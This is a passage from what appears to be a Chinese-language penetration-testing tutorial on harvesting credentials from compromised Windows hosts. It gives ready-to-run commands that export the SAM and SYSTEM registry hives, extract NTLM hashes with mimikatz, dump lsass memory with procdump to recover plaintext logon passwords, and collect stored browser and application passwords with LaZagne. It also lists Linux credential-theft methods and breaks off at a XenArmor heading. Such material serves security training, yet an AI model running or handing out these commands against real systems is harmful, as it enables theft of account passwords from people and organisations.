```
Windows： 本地密码Hash和明文密码/抓取浏览器密码/服务端明文密码
linux：history记录敏感操作/shadow文件破解/mimipenguin抓取密码/使用Strace收集登录凭证/全盘搜索敏感信息
```

#### 注册表读取密码

注册表读取密码主要获取的是两个文件：

```
reg save HKLM\SYSTEM Sys.hiv
reg save HKLM\SAM Sam.hiv
```

[![bTgtSg.png](https://s1.ax1x.com/2022/03/12/bTgtSg.png)](https://imgtu.com/i/bTgtSg)

导出注册表之后，我们可以通过mimikatz读取密码hash值：

~~~
mimikatz读取密码
mimikatz.exe "lsadump::sam /sam:Sam.hiv /system:Sys.hiv " exit> hiv.txt
~~~

[![bTggl4.png](https://s1.ax1x.com/2022/03/12/bTggl4.png)](https://imgtu.com/i/bTggl4)

[![bT2icQ.png](https://s1.ax1x.com/2022/03/12/bT2icQ.png)](https://imgtu.com/i/bT2icQ)

其中：NTLM加密的hash就是管理员登陆的加密密码！

#### lsass内存读取密码

lsass.exe是一个系统进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略zhi。要想读取内存的密码，前提是用户登陆过机器，登陆过就会在内存中停留：lsass.exe

使用工具：procdump.exe

~~~
procdump.exe -accepteula -ma lsass.exe lsass.dmp
~~~

[![bT2wge.png](https://s1.ax1x.com/2022/03/12/bT2wge.png)](https://imgtu.com/i/bT2wge)

然后再通过mimikatz读取：

08或者08以下的机器读取的是明文密码：测试机器是Windows server 2008

~~~
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
~~~

![](https://i.bmp.ovh/imgs/2022/03/1bad3b6c2c271a08.png)

#### LaZagne读取各类密码（浏览器等）

LaZagne是用于开源应用程序获取大量的密码存储在本地计算机上。每个软件都使用不同的技术（明文，API，自定义算法，[数据库](https://cloud.tencent.com/solution/database?from=10680)等）存储其密码。开发该工具的目的是为最常用的软件找到这些密码。

下载地址：

https://hub.fastgit.xyz/AlessandroZ/LaZagne

https://hub.fastgit.xyz/AlessandroZ/LaZagne/releases

~~~
获取所有密码：
lazagne.exe all
~~~

![](https://i.bmp.ovh/imgs/2022/03/1c88073b97a9ed67.png)

#### XenArmor All-In-One

直接抓







































































